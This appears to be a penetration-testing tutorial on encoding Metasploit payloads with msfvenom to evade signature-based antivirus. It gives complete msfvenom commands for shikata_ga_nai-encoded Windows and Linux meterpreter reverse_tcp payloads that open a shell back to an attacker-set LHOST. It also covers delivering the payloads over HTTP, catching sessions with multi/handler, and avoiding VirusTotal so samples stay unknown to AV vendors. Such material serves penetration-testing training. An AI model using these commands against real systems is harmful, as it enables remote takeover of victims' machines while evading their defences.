# Encoding Payloads with Msfvenom

+ Given that this attack vector involves the transfer and storage of a malicious payload on the client’s system (disk), attackers need to be cognisant of AV detection.

**Note**: Consider that when exploiting a vulnerability on a server, the payload won't actually touch the disk, as the payload will be executed in memory and regular AVs won't detect it. That's not the case with client side attacks, and that's why encoding the payload becomes important.

+ Most end user AV solutions utilize signature based detection in order to identify malicious files or executables.

+ We can evade older signature based AV solutions by encoding our payloads.

+ Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature.

**Note**: This attack vector is really not used anymore, as the new AV solutions have huge signature databases and better detection techniques. This could be useful for older and rudimentary AV solutions like Windows Defender in Windows 7 and in some cases in new AV, but it is not the method utilized in regards to client side attacks because of the limitations of encoding.

## Shellcode

+ Shellcode (shell-code) is a piece of code typically used as a payload for exploitation.

+ It gets its name from the term command shell, whereby shellcode is a piece of code that provides an attacker with a remote command shell on the target system.

## Laboratory

For this technical demonstration we won't need a lab environment. We can follow along using a simple kali virtual machine.

- Let's start by running `msfvenom --list encoders` to list all encoders.

**Note**: The best option is usually the shikata_ga_nai encoder. Its score is Excellent. For powershell, cmd/powershell_base64 could be an excellent option as well.

- Now we will run an example and add the -e option to specify the encoder: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/path/to/encoded/payload.exe`. Note that `windows/meterpreter/reverse_tcp` payload targets x86, and the encoder should also match the x86 arch. After the creation of the payload is completed, note the number of iterations. That's the nomber of times the payload was encoded and it is rather important.

**Note**: The more interations with shikata_ga_nai you have, the best chances you have of bypassing AVs.

- If we want to increase the number of iterations, we can do it by adding the -i option: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/path/to/encoded/payload.exe`. Note the -i after LPORT option.

**Note**: Anything after 10 interations will not really improve your chances of bypassing an AV.

- Now let's try encode a payload for linux. The process is really similar: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf > ~/path/to/encoded/payload`. Note the name of the payload changed but the name of the encoder is the same.

### Transfering Payload to the target

- To transfer the malicious payloads to the target machine, in this case we will start with windows. We need to have a windows 7 machine in the same network as our kali machine. We are going to setup a simple http web server and try to download the payloads to the windows machine from a web browser. Once we setup the web server, we are going to set up the listener using the msfconsole module `multihandler`. We only need to run `use multi/handler` inside the msfconsole and change the payload to the payload we crafted using msfvenom. And we also need to configure the LHOST and LPORT we configured in the payload with msfvenom.

**Note**: When using meterpreter payloads, we need to use the multihandler module to properly handle the connection. Simpler handlers like netcat could not work properly.

- From the windows target machine, enter the browser and download the payloads. Execute them and then you should see something happening on your kali machine, it should open a meterpreter session on the multihandler.

- For linux, we can do exactly the same, or even execute it from kali to test it out. It will connect to the multihandler and establish the meterpreter session.

**Note**: It is not recommended to test these payloads in virustotal, becuase the signature will be sent to AV companies. The best option is to test it out in a sandbox environment.
